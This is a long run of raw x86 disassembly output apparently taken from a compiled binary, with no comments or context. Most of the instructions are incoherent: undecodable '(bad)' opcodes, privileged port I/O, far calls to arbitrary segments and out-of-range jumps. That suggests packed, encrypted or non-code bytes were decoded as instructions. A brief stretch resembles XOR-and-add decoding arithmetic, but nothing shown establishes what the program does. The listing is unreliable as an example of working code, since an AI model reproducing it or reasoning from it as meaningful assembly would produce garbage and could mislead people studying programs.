  40a7be:	inc    esp
  40a7bf:	mov    ds:0x3490b693,eax
  40a7c4:	adc    BYTE PTR [edx+0x65fa6af2],ah
  40a7ca:	mov    edi,0x3fe5f7b4
  40a7cf:	stos   BYTE PTR es:[edi],al
  40a7d0:	or     bh,al
  40a7d2:	xlat   BYTE PTR ds:[ebx]
  40a7d3:	rcr    DWORD PTR [edi-0x43d01c5f],cl
  40a7d9:	xchg   ebx,eax
  40a7da:	in     eax,0x1
  40a7dc:	or     bh,BYTE PTR [edi+0x6]
  40a7df:	loopne 0x40a7ab
  40a7e1:	ds jmp 0x1fddc14b
  40a7e7:	xchg   edi,eax
  40a7e8:	les    ebp,FWORD PTR [edi]
  40a7ea:	mov    esp,0x683f0737
  40a7ef:	and    edi,edi
  40a7f1:	pop    esi
  40a7f2:	mov    bh,0x50
  40a7f4:	add    esi,DWORD PTR [ebp+edi*4+0x7c]
  40a7f8:	outs   dx,BYTE PTR ds:[esi]
  40a7f9:	ja     0x40a78a
  40a7fb:	fdivr  DWORD PTR cs:[edx]
  40a7fe:	mov    edi,0x40b1d83e
  40a803:	in     eax,dx
  40a804:	(bad)  
  40a805:	(bad)  
  40a806:	nop
  40a807:	in     al,dx
  40a808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a809:	in     eax,dx
  40a80a:	sub    al,0x65
  40a80c:	mov    ah,BYTE PTR [edi-0x7a]
  40a80f:	fwait
  40a810:	adc    bh,cl
  40a812:	sbb    eax,0xf0973e97
  40a817:	mov    ah,0x7d
  40a819:	int3   
  40a81a:	iret   
  40a81b:	dec    esi
  40a81c:	mov    esi,edi
  40a81e:	(bad)  
  40a81f:	mov    ah,0x1f
  40a821:	ss pop ebp
  40a823:	pop    es
  40a824:	lock pop esp
  40a826:	xor    al,0xe8
  40a828:	push   0x958b8a68
  40a82d:	inc    DWORD PTR [esi]
  40a82f:	add    eax,0x94ca789c
  40a834:	xchg   ecx,eax
  40a835:	loope  0x40a8a1
  40a837:	cmp    DWORD PTR [ecx],eax
  40a839:	fstp   DWORD PTR [ebx-0x3bbd6a52]
  40a83f:	das    
  40a840:	sub    esi,ebx
  40a842:	ins    BYTE PTR es:[edi],dx
  40a843:	lds    esp,FWORD PTR [eax+esi*8]
  40a846:	test   al,0x1f
  40a848:	xchg   DWORD PTR [esi-0x3a],ebx
  40a84b:	rcr    DWORD PTR [edx-0x48],cl
  40a84e:	fcmovb st,st(1)
  40a850:	jge    0x40a7f9
  40a852:	fdiv   QWORD PTR [ebx]
  40a854:	std    
  40a855:	push   edi
  40a856:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a858:	dec    edi
  40a859:	xchg   ecx,eax
  40a85a:	mov    DWORD PTR [eax],eax
  40a85c:	aas    
  40a85d:	sahf   
  40a85e:	push   ebx
  40a85f:	add    DWORD PTR [eax+0x56],ecx
  40a862:	jmp    0x40a8cd
  40a864:	ja     0x40a85a
  40a866:	pop    edx
  40a867:	jecxz  0x40a81e
  40a869:	int    0x2f
  40a86b:	clc    
  40a86c:	das    
  40a86d:	inc    esi
  40a86e:	push   0x77
  40a870:	out    dx,al
  40a871:	imul   ebx,DWORD PTR [edi-0x16],0xfffffffb
  40a875:	jp     0x40a866
  40a877:	and    DWORD PTR [ecx],0x4f
  40a87a:	or     al,0xa6
  40a87c:	jo     0x40a870
  40a87e:	pop    ds
  40a87f:	mov    bh,BYTE PTR [ecx+0x42]
  40a882:	push   eax
  40a883:	test   BYTE PTR [ebx-0x48f8a18],dl
  40a889:	loop   0x40a80d
  40a88b:	fst    QWORD PTR [eiz*4-0x1a4edba1]
  40a892:	dec    edx
  40a893:	mov    WORD PTR [edi-0x2d],?
  40a896:	pop    edx
  40a897:	push   0xffffff9c
  40a899:	sbb    DWORD PTR [esi+0x648a3bc4],ecx
  40a89f:	mov    ds:0x52a051cd,al
  40a8a4:	rdtsc  
  40a8a6:	xchg   ebx,eax
  40a8a7:	and    DWORD PTR [ecx],edx
  40a8a9:	mov    edx,0x4e5f7a46
  40a8ae:	pushf  
  40a8af:	xchg   BYTE PTR [edi+ecx*4+0x592954b9],dl
  40a8b6:	jne    0x40a86b
  40a8b8:	jae    0x40a890
  40a8ba:	jp     0x40a83c
  40a8bc:	pop    eax
  40a8bd:	mov    esi,0xaa324b8b
  40a8c2:	clc    
  40a8c3:	mov    edi,0xd7990dfc
  40a8c8:	daa    
  40a8c9:	sub    BYTE PTR [ebx+ecx*1],dl
  40a8cc:	xchg   ebx,eax
  40a8cd:	pop    esp
  40a8ce:	ja     0x40a877
  40a8d0:	inc    esp
  40a8d1:	adc    DWORD PTR [edx],edi
  40a8d3:	jp     0x40a8b6
  40a8d5:	repz adc dl,BYTE PTR [edx+eiz*8]
  40a8d9:	(bad)  
  40a8da:	imul   eax,DWORD PTR [ebx-0xf],0xffffffd9
  40a8de:	or     eax,0x221a2cf0
  40a8e3:	ret    
  40a8e4:	sbb    BYTE PTR [edi-0x3001c74c],ah
  40a8ea:	mov    DWORD PTR [edx+0x5d099b8e],edi
  40a8f0:	test   al,0x36
  40a8f2:	sub    BYTE PTR [esi],0xb4
  40a8f5:	pushf  
  40a8f6:	jg     0x40a94d
  40a8f8:	mov    BYTE PTR [ecx+edi*2-0x23132a64],al
  40a8ff:	ret    
  40a900:	mov    DWORD PTR [ebx-0x30],eax
  40a903:	ins    DWORD PTR es:[edi],dx
  40a904:	jb     0x40a8a5
  40a906:	sti    
  40a907:	inc    esi
  40a908:	inc    eax
  40a909:	imul   esp,DWORD PTR ds:0x61e0cd28,0x578c227e
  40a913:	in     al,dx
  40a914:	(bad)
  40a919:	mul    BYTE PTR [edi+ecx*1+0x4b]
  40a91d:	pop    eax
  40a91e:	add    al,0x98
  40a920:	xor    al,0xff
  40a922:	mov    BYTE PTR [edx+0x32],al
  40a925:	pop    ss
  40a926:	into   
  40a927:	cmc    
  40a928:	dec    edi
  40a929:	dec    ebx
  40a92a:	jmp    0xad9f977c
  40a92f:	in     eax,0xe8
  40a931:	sbb    BYTE PTR [esp+eiz*4-0x6fa902b1],0x1f
  40a939:	mov    bh,0xc1
  40a93b:	fdiv   DWORD PTR [edx-0x70]
  40a93e:	std    
  40a93f:	xchg   ecx,eax
  40a940:	adc    al,0x6f
  40a942:	(bad)  
  40a943:	test   eax,0xe2dc9661
  40a948:	dec    eax
  40a949:	mov    WORD PTR [esi+0x24],ss
  40a94c:	jecxz  0x40a9a3
  40a94e:	mov    ch,0xb2
  40a950:	inc    esp
  40a951:	outs   dx,DWORD PTR ds:[esi]
  40a952:	jge    0x40a8db
  40a954:	addr16 xchg si,ax
  40a957:	(bad)  
  40a958:	into   
  40a959:	pushf  
  40a95a:	fadd   QWORD PTR ds:0xc0bb440e
  40a960:	arpl   WORD PTR [ebx+0x4b],sp
  40a963:	call   0x4c78:0x9c50f8e1
  40a96a:	xchg   DWORD PTR [eax-0x23],edi
  40a96d:	pop    edi
  40a96e:	call   0x21ceacf7
  40a973:	ror    BYTE PTR [edx+0x67],0x91
  40a977:	sbb    ah,BYTE PTR [edi+0x8be625f]
  40a97d:	adc    DWORD PTR [ebp-0x23c00e66],0x828f60c6
  40a987:	pop    ebx
  40a988:	pop    ebp
  40a989:	pop    esi
  40a98a:	mov    ecx,0x7d04c78e
  40a98f:	daa    
  40a990:	cdq    
  40a991:	push   edx
  40a992:	inc    BYTE PTR [edi+0x5d]
  40a995:	jne    0x40a9c5
  40a997:	sub    eax,0x402e0875
  40a99c:	add    eax,0xcc71ef6c
  40a9a1:	add    BYTE PTR [edi],cl
  40a9a3:	loopne 0x40a982
  40a9a5:	arpl   WORD PTR [ecx+0x1b],di
  40a9a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9a9:	ins    BYTE PTR es:[edi],dx
  40a9aa:	(bad)  
  40a9ab:	jb     0x40a96d
  40a9ad:	mov    dl,0xb7
  40a9af:	in     eax,0xc4
  40a9b1:	shl    DWORD PTR [eax-0x501d0c85],cl
  40a9b7:	and    bl,al
  40a9b9:	or     al,0x51
  40a9bb:	(bad)  
  40a9bc:	in     eax,0xa7
  40a9be:	es inc edx
  40a9c0:	and    BYTE PTR [ebx+0x662933f0],dh
  40a9c6:	popa   
  40a9c7:	dec    ecx
  40a9c8:	add    al,0x30
  40a9ca:	ja     0x40a9cf
  40a9cc:	mov    esp,0xc01e71ad
  40a9d1:	pop    esp
  40a9d2:	test   BYTE PTR [eax-0x33],bl
  40a9d5:	sub    esi,DWORD PTR [ecx+eax*1+0x1d]
  40a9d9:	adc    eax,0x839d0fa8
  40a9de:	push   esi
  40a9df:	adc    al,0xfd
  40a9e1:	push   eax
  40a9e2:	jae    0x40aa13
  40a9e4:	jbe    0x40a9e7
  40a9e6:	or     BYTE PTR [edx+edi*8],dh
  40a9e9:	push   0xffffffa5
  40a9eb:	jbe    0x40a9ff
  40a9ed:	ins    DWORD PTR es:[edi],dx
  40a9ee:	pop    es
  40a9ef:	inc    edx
  40a9f0:	or     eax,0xabb1daae
  40a9f5:	mov    ebx,DWORD PTR [esi]
  40a9f7:	mov    BYTE PTR [edi+ebx*8+0x25],ch
  40a9fb:	mov    ah,0xd0
  40a9fd:	jnp    0x40aa52
  40a9ff:	sub    esi,eax
  40aa01:	(bad)  
  40aa02:	or     edi,ecx
  40aa04:	cmp    BYTE PTR [ecx],bh
  40aa06:	xlat   BYTE PTR ds:[ebx]
  40aa07:	push   esi
  40aa08:	(bad)  
  40aa09:	stos   BYTE PTR es:[edi],al
  40aa0a:	fistp  WORD PTR [ebp+eax*8+0x2a]
  40aa0e:	jle    0x40aa64
  40aa10:	arpl   WORD PTR [esi],si
  40aa12:	jne    0x40a9cd
  40aa14:	dec    ebp
  40aa15:	out    dx,al
  40aa16:	mov    BYTE PTR [esi],0x92
  40aa19:	loopne 0x40a9cf
  40aa1b:	dec    ebx
  40aa1c:	xchg   ebx,eax
  40aa1d:	push   edi
  40aa1e:	inc    ebp
  40aa1f:	xchg   esi,eax
  40aa20:	mov    edx,0x4e9e9e35
  40aa25:	stos   BYTE PTR es:[edi],al
  40aa26:	aas    
  40aa27:	in     eax,0xd7
  40aa29:	sub    DWORD PTR [ebx-0x43bef392],edi
  40aa2f:	push   esp
  40aa30:	jle    0x40aa79
  40aa32:	mov    eax,ds:0x183c5ce3
  40aa37:	das    
  40aa38:	sbb    BYTE PTR [edi-0x21],0xd8
  40aa3c:	jle    0x40a9eb
  40aa3e:	loope  0x40aa98
  40aa40:	cmp    DWORD PTR [ecx+0x69],esi
  40aa43:	xor    DWORD PTR [edi+eiz*4-0x21c716c7],eax
  40aa4a:	lds    esi,FWORD PTR [edi]
  40aa4c:	and    bh,BYTE PTR [edx-0x7d]
  40aa4f:	lds    ebp,FWORD PTR [ebx-0x810a245]
  40aa55:	or     esp,esp
  40aa57:	xchg   ebx,eax
  40aa58:	ret    0x775c
  40aa5b:	cmp    DWORD PTR [eax-0x34],ecx
  40aa5e:	adc    dl,BYTE PTR [esi]
  40aa60:	pop    edx
  40aa61:	je     0x40aa57
  40aa63:	dec    ecx
  40aa64:	mul    BYTE PTR [esi]
  40aa66:	and    eax,0xff393d88
  40aa6b:	mov    DWORD PTR [ecx-0x61],eax
  40aa6e:	add    al,BYTE PTR [esi-0x25]
  40aa71:	sbb    ah,al
  40aa73:	in     eax,0x96
  40aa75:	dec    esp
  40aa76:	aas    
  40aa77:	imul   ebp,DWORD PTR [edx],0x327fc72f
  40aa7d:	loope  0x40aafd
  40aa7f:	out    0x93,eax
  40aa81:	pop    ebx
  40aa82:	dec    ebp
  40aa83:	iret   
  40aa84:	pop    ecx
  40aa85:	call   0xb4ca:0xf5684033
  40aa8c:	dec    eax
  40aa8d:	sbb    DWORD PTR [ecx],0xf
  40aa90:	xor    eax,ecx
  40aa92:	mov    edx,0x3272db
  40aa97:	add    eax,edx
  40aa99:	mov    DWORD PTR [ebp+0x8],eax
  40aa9c:	mov    eax,DWORD PTR [ebp-0x14]
  40aa9f:	xor    eax,ecx
  40aaa1:	add    eax,edx
  40aaa3:	mov    edx,DWORD PTR [ebp+0x14]
  40aaa6:	imul   eax,DWORD PTR [edx]
  40aaa9:	mov    edx,DWORD PTR [ebp-0x4]
  40aaac:	xor    edx,ecx
  40aaae:	mov    ecx,DWORD PTR [ebp+0x8]
  40aab1:	lea    ecx,[edx+ecx*1+0x3272db]
  40aab8:	jmp    0x40ce47
  40aabd:	inc    esi
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	mov    esp,0x5a393f3
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	rcl    bl,cl
  40aac7:	mov    edx,0xafd31ebc
  40aacc:	xchg   esp,eax
  40aacd:	push   esp
  40aace:	hlt    
  40aacf:	bound  esp,QWORD PTR [edx+0x10]
  40aad2:	pop    edi
  40aad3:	bound  esp,QWORD PTR [edx+0xb]
  40aad6:	dec    ecx
  40aad7:	mov    dl,0xac
  40aad9:	icebp  
  40aada:	mov    bh,BYTE PTR [edi-0x38]
  40aadd:	gs aad 0x2b
  40aae0:	jp     0x40aa92
  40aae2:	(bad)  
  40aae3:	adc    esi,DWORD PTR [ebp+0x69]
  40aae6:	mov    bh,0xff
  40aae8:	shl    esi,1
  40aaea:	in     al,0x4b
  40aaec:	sub    esp,DWORD PTR [ebx-0x1166f8b9]
  40aaf2:	ret    0xea33
  40aaf5:	dec    edi
  40aaf6:	clc    
  40aaf7:	mov    edx,0x4a7bdc50
  40aafc:	dec    esp
  40aafd:	(bad)  
  40aafe:	push   edx
  40aaff:	and    eax,0xc5ca820e
  40ab04:	(bad)  
  40ab05:	out    dx,eax
  40ab06:	mov    ch,0x79
  40ab08:	(bad)  [ebx+0x47]
  40ab0b:	push   0xed3dc59d
  40ab10:	lock sub al,0x71
  40ab13:	dec    ebp
  40ab14:	mov    al,0x6d
  40ab16:	cmc    
  40ab17:	and    edi,DWORD PTR [eax]
  40ab19:	dec    esp
  40ab1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab1b:	cmp    BYTE PTR [ecx],0x9f
  40ab1e:	pop    gs
  40ab20:	cmp    BYTE PTR [edi+0x5],0x53
  40ab24:	ins    DWORD PTR es:[edi],dx
  40ab25:	xlat   BYTE PTR ds:[ebx]
  40ab26:	les    ecx,FWORD PTR [ebx+0x6b78cf88]
  40ab2c:	cmp    DWORD PTR [edx+0x69],esi
  40ab2f:	fiadd  DWORD PTR [ebx-0x46]
  40ab32:	mov    WORD PTR [ebx],cs
  40ab34:	sub    bl,BYTE PTR [esi-0x448699c5]
  40ab3a:	sub    DWORD PTR [ecx+0x4a34b6b3],eax
  40ab40:	ret    
  40ab41:	adc    ch,0x21
  40ab44:	sbb    eax,0x4de6bdb7
  40ab49:	sbb    esi,DWORD PTR [ecx+0x34]
  40ab4c:	fistp  QWORD PTR [ebx+0x3bff17c0]
  40ab52:	xchg   BYTE PTR [eax],dh
  40ab54:	xor    DWORD PTR ss:[edi-0x53bd7224],ebx
  40ab5b:	cdq    
  40ab5c:	je     0x40abaf
  40ab5e:	je     0x40ab2f
  40ab60:	sub    edi,DWORD PTR [edi+0x23]
  40ab63:	add    DWORD PTR [ebx],edi
  40ab65:	call   0x76ecbca8
  40ab6a:	lods   al,BYTE PTR gs:[esi]
  40ab6c:	jecxz  0x40abe7
  40ab6e:	pop    es
  40ab6f:	lea    edi,[ebp+ebx*4+0x604943b2]
  40ab76:	jo     0x40abee
  40ab78:	sub    BYTE PTR [edx-0x2fe65792],ah
  40ab7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab7f:	outs   dx,BYTE PTR ds:[esi]
  40ab80:	mov    fs,eax
  40ab82:	jno    0x40ab64
  40ab84:	mov    edi,0x31c952c1
  40ab89:	adc    DWORD PTR [esi+0x7c05fa50],esi
  40ab8f:	add    ah,BYTE PTR [ebx+0x3939f593]
  40ab95:	cmp    DWORD PTR [edx-0x39ce9156],edx
  40ab9b:	fcomp  QWORD PTR [edi]
  40ab9d:	ror    DWORD PTR [ecx],1
  40ab9f:	lods   eax,DWORD PTR ds:[esi]
  40aba0:	jne    0x40ac09
  40aba2:	mov    BYTE PTR [edx+0x27e51f9e],ch
  40aba8:	xchg   DWORD PTR [ebp-0x6a],ebx
  40abab:	sub    ah,ch
  40abad:	imul   edx,DWORD PTR [ecx],0xbaee9577
  40abb3:	nop
  40abb4:	and    esp,DWORD PTR [ecx+0x19]
  40abb7:	push   ebx
  40abb8:	jnp    0x40ab81
  40abba:	mov    eax,ds:0xfc1ade5f
  40abbf:	inc    esi
  40abc0:	into   
  40abc1:	fsincos 
  40abc3:	sub    DWORD PTR [edx-0x8416f56],ebp
  40abc9:	jmp    0xef742dba
  40abce:	aam    0x69
  40abd0:	xchg   edi,eax
  40abd1:	shl    al,1
  40abd3:	sub    al,0xb0
  40abd6:	xor    ah,cl
  40abd8:	(bad)  
  40abd9:	jmp    FWORD PTR [ecx+0x46]
  40abdc:	imul   BYTE PTR [eax+0x1b]
  40abdf:	xor    al,0x39
  40abe1:	lahf   
  40abe2:	inc    ebp
  40abe3:	dec    eax
  40abe4:	sub    eax,0x23a8209e
  40abe9:	inc    edx
  40abea:	jne    0x40ac28
  40abec:	jmp    0xa620:0x3a8a960
  40abf3:	pop    ss
  40abf4:	pop    eax
  40abf5:	test   BYTE PTR [esp+ecx*4],cl
  40abf8:	inc    ebx
  40abf9:	jmp    0x5261edd1
  40abfe:	imul   eax,DWORD PTR [esi+0x57],0xffffff97
  40ac02:	add    ecx,DWORD PTR [ecx]
  40ac04:	test   eax,0xba21a4c
  40ac09:	mov    ds:0xf5ed4561,eax
  40ac0e:	sbb    al,0x7f
  40ac10:	loopne 0x40abdd
  40ac12:	(bad)
  40ac16:	mov    eax,0x833c68c
  40ac1b:	jns    0x40abba
  40ac1d:	cwde   
  40ac1e:	sub    BYTE PTR [ebx+eiz*2+0x11743ff7],0xf1
  40ac26:	adc    BYTE PTR [ebp+0x3c202365],bh
  40ac2c:	mov    esp,0x197fd680
  40ac31:	pop    ebx
  40ac32:	imul   edx,DWORD PTR [esi],0xe6665ae6
  40ac38:	and    eax,0x2bf0cb37
  40ac3d:	mov    bh,0x3f
  40ac3f:	inc    ecx
  40ac40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac41:	call   esi
  40ac43:	mov    edx,0xad697386
  40ac49:	jge    0x40acc5
  40ac4b:	icebp  
  40ac4c:	ret    
  40ac4d:	xor    bl,BYTE PTR [esi+eiz*4]
  40ac50:	stos   BYTE PTR es:[edi],al
  40ac51:	lahf   
  40ac52:	or     eax,0x343941be
  40ac57:	mov    ebx,0x9c2b1a2a
  40ac5c:	push   0xdbfcac09
  40ac61:	daa    
  40ac62:	mov    BYTE PTR [ebx-0x2de05b4c],ch
  40ac68:	rcl    DWORD PTR [eax+0x3dcbd41e],0x51
  40ac6f:	pushf  
  40ac70:	sar    dh,1
  40ac72:	push   ebx
  40ac73:	inc    ebx
  40ac74:	sub    eax,0xc5950324
  40ac79:	push   ds
  40ac7a:	das    
  40ac7b:	aad    0x3e
  40ac7d:	loopne 0x40aca7
  40ac7f:	ins    BYTE PTR es:[edi],dx
  40ac80:	jne    0x40ac67
  40ac82:	es out 0x8d,al
  40ac85:	sbb    eax,0xb8543dd3
  40ac8a:	mov    ebx,0x15c06a0b
  40ac8f:	jo     0x40acb4
  40ac91:	ficomp WORD PTR [ecx*2+0x159e4fb9]
  40ac98:	fcomip st,st(5)
  40ac9a:	mov    eax,DWORD PTR [esp+edi*8-0x18]
  40ac9e:	dec    esp
  40ac9f:	retf   0x8d15
  40aca2:	and    eax,0xe19e299a
  40aca7:	int3   
  40aca8:	ins    DWORD PTR es:[edi],dx
  40aca9:	xchg   ebx,eax
  40acaa:	xlat   BYTE PTR ds:[ebx]
  40acab:	std    
  40acac:	fmul   QWORD PTR [ebp-0x22]
  40acaf:	dec    ecx
  40acb0:	dec    eax
  40acb1:	mov    esp,0x62a1affc
  40acb6:	popf   
  40acb7:	fstp   DWORD PTR [edi-0x2b]
  40acba:	clc    
  40acbb:	xor    eax,DWORD PTR [ecx-0x6bc9bdc7]
  40acc1:	test   eax,0xef1cc35c
  40acc6:	cmp    al,dh
  40acc8:	mov    bl,0x55
  40acca:	mov    bh,0xfe
  40accc:	adc    BYTE PTR [eax],0xc4
  40accf:	dec    edi
  40acd0:	inc    eax
  40acd1:	popf   
  40acd2:	inc    edi
  40acd3:	cmc    
  40acd4:	sub    ah,al
  40acd6:	push   eax
  40acd7:	adc    esp,esi
  40acd9:	add    BYTE PTR [eax],dl
  40acdb:	dec    ecx
  40acdc:	inc    ecx
  40acdd:	leave  
  40acde:	cld    
  40acdf:	out    0xd9,eax
  40ace1:	and    DWORD PTR [esi],esi
  40ace3:	inc    ecx
  40ace4:	stos   BYTE PTR es:[edi],al
  40ace5:	cmp    bh,ch
  40ace7:	addr16 retf 0x600e
  40aceb:	xchg   ecx,eax
  40acec:	mov    bh,cl
  40acee:	jmpw   0xa211
  40acf2:	sar    ah,0xd
  40acf5:	dec    eax
  40acf6:	pushf  
  40acf7:	ins    DWORD PTR es:[edi],dx
  40acf8:	push   esi
  40acf9:	add    eax,0x192598cf
  40acfe:	or     BYTE PTR [ecx+0x4f],0xa0
  40ad02:	(bad)  
  40ad03:	or     WORD PTR [esi],sp
  40ad06:	adc    eax,0xe6f249d8
  40ad0b:	jno    0x40ad6c
  40ad0d:	out    0x52,eax
  40ad0f:	test   eax,0x598f94d3
  40ad14:	jne    0x40ad64
  40ad16:	lods   eax,DWORD PTR ds:[esi]
  40ad17:	aas    
  40ad18:	mov    BYTE PTR [ecx],dl
  40ad1a:	dec    esp
  40ad1b:	adc    DWORD PTR [edi+0x3e],ecx
  40ad1e:	mov    eax,0x4589fb19
  40ad23:	inc    edx
  40ad24:	pusha  
  40ad25:	mov    cl,BYTE PTR [ecx-0x1a3a7e95]
  40ad2b:	stos   BYTE PTR es:[edi],al
  40ad2c:	hlt    
  40ad2d:	dec    edx
  40ad2e:	mov    al,ds:0x4510d2e9
  40ad33:	xor    bl,BYTE PTR [eax-0x2b]
  40ad36:	push   0x32
  40ad38:	ret    0xd304
  40ad3b:	dec    eax
  40ad3c:	adc    BYTE PTR [ebp-0xe],dl
  40ad3f:	shl    BYTE PTR [eax-0x62],cl
  40ad42:	jae    0x40ad6f
  40ad44:	in     eax,dx
  40ad45:	das    
  40ad46:	add    bl,BYTE PTR [ecx-0x74]
  40ad49:	(bad)  
  40ad4a:	push   ebx
  40ad4b:	sbb    dl,al
  40ad4d:	stos   BYTE PTR es:[edi],al
  40ad4e:	hlt    
  40ad4f:	sahf   
  40ad50:	mov    ds:0x5c3c2d58,eax
  40ad55:	rcr    DWORD PTR [ecx-0x6],cl
  40ad58:	or     eax,0x9e9d8d4a
  40ad5d:	retf   
  40ad5e:	and    DWORD PTR [eax-0x5d3de8c0],eax
  40ad64:	hlt    
  40ad65:	clc    
  40ad66:	inc    ebx
  40ad67:	sub    eax,0x2aa84bc
  40ad6c:	sbb    DWORD PTR [edx+0x23],esp
  40ad6f:	push   ss
  40ad70:	lods   al,BYTE PTR ds:[esi]
  40ad71:	or     ah,BYTE PTR [esi+eax*2]
  40ad74:	pop    edi
  40ad75:	inc    edx
  40ad76:	jno    0x40ade1
  40ad78:	dec    esi
  40ad79:	push   es
  40ad7a:	add    eax,0x3ea47d3
  40ad7f:	or     al,0xae
  40ad81:	out    dx,al
  40ad82:	add    BYTE PTR ds:0xdd97bd3e,ch
  40ad88:	push   esp
  40ad89:	push   cs
  40ad8a:	jnp    0x40ada0
  40ad8c:	xor    cl,BYTE PTR [esi+0x26966896]
  40ad92:	pop    esi
  40ad93:	mov    esp,0xa358baee
  40ad98:	push   edx
  40ad99:	mov    al,ds:0x630d4f6a
  40ad9e:	hlt    
  40ad9f:	inc    ecx
  40ada0:	(bad)  
  40ada1:	adc    al,0x64
  40ada3:	push   0x6e
  40ada5:	inc    eax
  40ada6:	inc    ebx
  40ada7:	xchg   esp,eax
  40ada8:	(bad)  
  40ada9:	pop    ss
  40adaa:	cli    
  40adab:	sha1msg1 xmm1,xmm7
  40adaf:	inc    ebp
  40adb0:	jbe    0x40ad80
  40adb2:	inc    ebp
  40adb3:	add    eax,0x3e870574
  40adb8:	outs   dx,BYTE PTR ds:[esi]
  40adb9:	addr16 dec esi
  40adbb:	jo     0x40add5
  40adbd:	mov    WORD PTR [edi+0x3],es
  40adc0:	push   edi
  40adc1:	jmp    0x40ade4
  40adc3:	pusha  
  40adc4:	add    eax,0x98257f02
  40adc9:	jno    0x40ad9a
  40adcb:	sbb    al,0x85
  40adcd:	adc    eax,0x8826ffa1
  40add2:	pop    edx
  40add3:	sub    BYTE PTR [ebx+0x1810a24a],bl
  40add9:	pop    ebp
  40adda:	fucomip st,st(6)
  40addc:	out    dx,al
  40addd:	in     al,dx
  40adde:	inc    ecx
  40addf:	dec    ebx
  40ade0:	stos   BYTE PTR es:[edi],al
  40ade1:	fistp  QWORD PTR [edi-0x74]
  40ade4:	lds    esp,FWORD PTR [edi+0x4aff63fe]
  40adea:	mov    bl,ah
  40adec:	push   ebx
  40aded:	fild   DWORD PTR [ecx+ebx*1]
  40adf0:	cmp    DWORD PTR [ebx+0x1],0xb
  40adf4:	lds    eax,FWORD PTR [esi+0x7ccf09fc]
  40adfa:	mov    WORD PTR [eax+eax*8+0x22154980],?
  40ae01:	pop    es
  40ae02:	xor    al,0x8c
  40ae04:	pop    edx
  40ae05:	and    al,0x44
  40ae07:	(bad)  
  40ae08:	in     eax,dx
  40ae09:	je     0x40ad9c
  40ae0b:	dec    ebp
  40ae0c:	sbb    al,BYTE PTR [edi+ecx*4+0x4c968f6c]
  40ae13:	or     bh,BYTE PTR [edi+0x57]
  40ae16:	jae    0x40ae76
  40ae18:	les    esp,FWORD PTR [ecx+0x70d2dd97]
  40ae1e:	out    dx,al
  40ae1f:	jnp    0x40adf2
  40ae21:	push   esp
  40ae22:	mov    bh,0x1f
  40ae24:	shl    DWORD PTR [esi+0x5c],0x2c
  40ae28:	pop    ecx
  40ae29:	int    0x9d
  40ae2b:	(bad)  
  40ae2c:	xlat   BYTE PTR ds:[ebx]
  40ae2d:	push   cs
  40ae2e:	test   al,0xce
  40ae30:	add    edi,DWORD PTR [edi]
  40ae32:	jne    0x40ae54
  40ae34:	aas    
  40ae35:	call   0x6fe3:0x2737c63d
  40ae3c:	mov    esp,0xabe1cf8a
  40ae41:	je     0x40ae29
  40ae43:	pop    edx
  40ae44:	and    DWORD PTR [ebp+0x4c],ebp
  40ae47:	ja     0x40ae69
  40ae49:	or     al,0x4e
  40ae4b:	jno    0x40ae62
  40ae4d:	into   
  40ae4e:	test   DWORD PTR [esi],ebx
  40ae50:	add    ecx,DWORD PTR [ecx-0x4f3d3cb0]
  40ae56:	push   cs
  40ae57:	ja     0x40ae54
  40ae59:	out    0xb0,al
  40ae5b:	ficom  DWORD PTR [ebp-0x21bf2c56]
  40ae61:	and    ebx,DWORD PTR [edx-0x7c]
  40ae64:	mov    bh,0xab
  40ae66:	sbb    al,0xc6
  40ae68:	out    dx,al
  40ae69:	call   DWORD PTR [edi-0x2a]
  40ae6c:	icebp  
  40ae6d:	mov    ebx,0x3489eddf
  40ae72:	sub    BYTE PTR [esi],dh
  40ae74:	jns    0x40aec3
  40ae76:	ins    BYTE PTR es:[edi],dx
  40ae77:	shr    BYTE PTR [eax],1
  40ae79:	cld    
  40ae7a:	(bad)  [ecx+ebp*2+0x69]
  40ae7e:	xor    al,0x75
  40ae80:	or     ebx,DWORD PTR [eax+0x2f]
  40ae83:	popa   
  40ae84:	mov    ds,WORD PTR gs:[ebx]
  40ae87:	fisttp WORD PTR [eax]
  40ae89:	dec    esp
  40ae8a:	push   ss
  40ae8b:	add    DWORD PTR ds:0xe56581f4,ecx
  40ae91:	fmul   DWORD PTR [esp+ecx*8]
  40ae94:	outs   dx,DWORD PTR ds:[esi]
  40ae95:	mul    BYTE PTR [esi+0x30]
  40ae98:	into   
  40ae99:	sbb    BYTE PTR [si+0x1],bh
  40ae9d:	shl    BYTE PTR [edx-0x71],1
  40aea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aea1:	bound  edi,QWORD PTR ds:0xbcdfc41f
  40aea7:	push   eax
  40aea8:	jo     0x40ae69
  40aeaa:	nop
  40aeab:	xor    ebp,DWORD PTR ds:[ecx+0x7c85975f]
  40aeb2:	cld    
  40aeb3:	dec    esi
  40aeb4:	cwde   
  40aeb5:	dec    ecx
  40aeb6:	inc    edi
  40aeb7:	ds inc esi
  40aeb9:	jle    0x40aed9
  40aebb:	into   
  40aebc:	mov    esi,DWORD PTR [esp+edi*8+0xc]
  40aec0:	(bad)  
  40aec1:	mov    bh,0xba
  40aec3:	mov    esp,0xe92e68f6
  40aec8:	xor    esp,ecx
  40aeca:	mov    edi,0x3ec281f4
  40aecf:	cs imul edx,eax,0x1e
  40aed3:	mov    bh,0x2d
  40aed5:	shl    BYTE PTR [edi],0x60
  40aed8:	loop   0x40aef1
  40aeda:	xchg   edx,eax
  40aedb:	aam    0x39
  40aedd:	sub    al,0x15
  40aedf:	inc    ecx
  40aee0:	cli    
  40aee1:	jg     0x40af10
  40aee3:	sbb    bl,BYTE PTR ds:0x70036b7d
  40aee9:	mov    ebx,0x1aeb0780
  40aeee:	sub    DWORD PTR [ecx-0x6],0x30129e4a
  40aef5:	mov    dh,0xc2
  40aef7:	call   0x4019:0x36b69c8b
  40aefe:	push   0xfffffff1
  40af00:	pop    ebx
  40af01:	jge    0x40af59
  40af03:	sub    DWORD PTR ds:0x9450b4ca,edx
  40af09:	fwait
  40af0a:	xor    al,0x68
